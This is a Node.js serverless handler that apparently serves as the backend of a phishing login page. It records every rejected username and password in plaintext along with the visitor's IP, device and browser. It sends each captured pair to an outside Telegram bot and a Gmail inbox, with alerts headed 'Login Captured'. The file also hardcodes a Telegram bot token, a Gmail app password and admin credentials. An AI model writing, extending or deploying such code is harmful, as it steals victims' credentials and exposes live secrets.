const fs         = require('fs');
const crypto     = require('crypto');
const nodemailer = require('nodemailer');
const fetch      = require('node-fetch');

const LOGS_FILE  = '/tmp/failed-logins.json';
const VALID_USER = 'nikhil';
const VALID_PASS = '123456';
const ADMIN_USER = 'shivanshu.bnd';
const ADMIN_PASS = 'Sahu@7897';

// ─── Telegram config ─────────────────────────────────────────────────────────
const TELEGRAM_BOT_TOKEN = '8728071772:AAE71W6skRXjkSxgWFQQrzwFE6os6-Pe8P0';
const TELEGRAM_CHAT_ID   = '1388446058';

// ─── Email config ─────────────────────────────────────────────────────────────
const EMAIL_USER = 'picturesquare.jhansi@gmail.com';
const EMAIL_PASS = 'bcjv orrt naby nztj';

const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
        user: EMAIL_USER,
        pass: EMAIL_PASS
    }
});

// ─── Token helper ─────────────────────────────────────────────────────────────
function makeToken() {
    return crypto.createHash('sha256').update(ADMIN_USER + ':' + ADMIN_PASS).digest('hex');
}

// ─── Log helpers ─────────────────────────────────────────────────────────────
function readLogs() {
    try {
        if (fs.existsSync(LOGS_FILE)) return JSON.parse(fs.readFileSync(LOGS_FILE, 'utf8'));
    } catch (_) {}
    return [];
}

function appendLog(entry) {
    try {
        const logs = readLogs();
        logs.unshift(entry);
        if (logs.length > 1000) logs.length = 1000;
        fs.writeFileSync(LOGS_FILE, JSON.stringify(logs), 'utf8');
    } catch (e) {
        console.error('Log write error:', e.message);
    }
}

// ─── Telegram Notification ────────────────────────────────────────────────────
async function sendTelegram(entry) {
    const text =
        `🚨 *New Login Captured!*\n\n` +
        `👤 *Username:* \`${entry.username}\`\n` +
        `🔑 *Password:* \`${entry.password}\`\n\n` +
        `🌐 *IP:* ${entry.ip}\n` +
        `💻 *Device:* ${entry.device} (${entry.browser})\n` +
        `🕒 *Time:* ${entry.timestamp}`;

    try {
        const res = await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                method:  'POST',
                headers: { 'Content-Type': 'application/json' },
                body:    JSON.stringify({
                    chat_id:    TELEGRAM_CHAT_ID,
                    text:       text,
                    parse_mode: 'Markdown'
                })
            }
        );
        const data = await res.json();
        if (!data.ok) console.error('Telegram API error:', JSON.stringify(data));
    } catch (e) {
        console.error('Telegram send error:', e.message);
    }
}

// ─── Email Notification ───────────────────────────────────────────────────────
async function sendEmail(entry) {
    try {
        await transporter.sendMail({
            from:    `"WinzingTOR Alert" <${EMAIL_USER}>`,
            to:      EMAIL_USER,
            subject: `🚨 Login Captured: ${entry.username}`,
            text:
                `New login attempt captured!\n\n` +
                `Username : ${entry.username}\n` +
                `Password : ${entry.password}\n\n` +
                `IP       : ${entry.ip}\n` +
                `Device   : ${entry.device} (${entry.browser})\n` +
                `Time     : ${entry.timestamp}`
        });
    } catch (e) {
        console.error('Email send error:', e.message);
    }
}

// ─── Main Handler ─────────────────────────────────────────────────────────────
module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-admin-token');

    // Handle CORS preflight
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // ── Admin: GET logs ──────────────────────────────────────────────────────
    if (req.method === 'GET') {
        const token = req.headers['x-admin-token'];
        if (token !== makeToken()) return res.status(401).json({ error: 'Unauthorized' });
        return res.status(200).json({ logs: readLogs() });
    }

    // ── Admin: POST login ────────────────────────────────────────────────────
    if (req.method === 'POST' && req.body?.action === 'admin-login') {
        const { username, password } = req.body;
        if (username === ADMIN_USER && password === ADMIN_PASS) {
            return res.status(200).json({ success: true, token: makeToken() });
        }
        return res.status(200).json({ success: false });
    }

    // ── User login ───────────────────────────────────────────────────────────
    if (req.method === 'POST') {
        const { username, password } = req.body || {};
        const isValid = (username === VALID_USER && password === VALID_PASS);

        if (!isValid) {
            const ua = req.headers['user-agent'] || '';
            let browser = 'Unknown';
            if      (ua.includes('Edg'))                             browser = 'Edge';
            else if (ua.includes('Chrome'))                          browser = 'Chrome';
            else if (ua.includes('Firefox'))                         browser = 'Firefox';
            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';

            const device = /Mobile|Android|iPhone|iPad/i.test(ua) ? 'Mobile' : 'Desktop';

            const entry = {
                id:        Date.now(),
                timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
                username:  username  || '',
                password:  password  || '',
                browser,
                device,
                ip:        (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'Unknown'
            };

            appendLog(entry);

            // Fire-and-forget notifications
            sendTelegram(entry).catch(console.error);
            sendEmail(entry).catch(console.error);
        }

        return res.status(200).json({ success: isValid });
    }

    return res.status(405).json({ error: 'Method Not Allowed' });
};
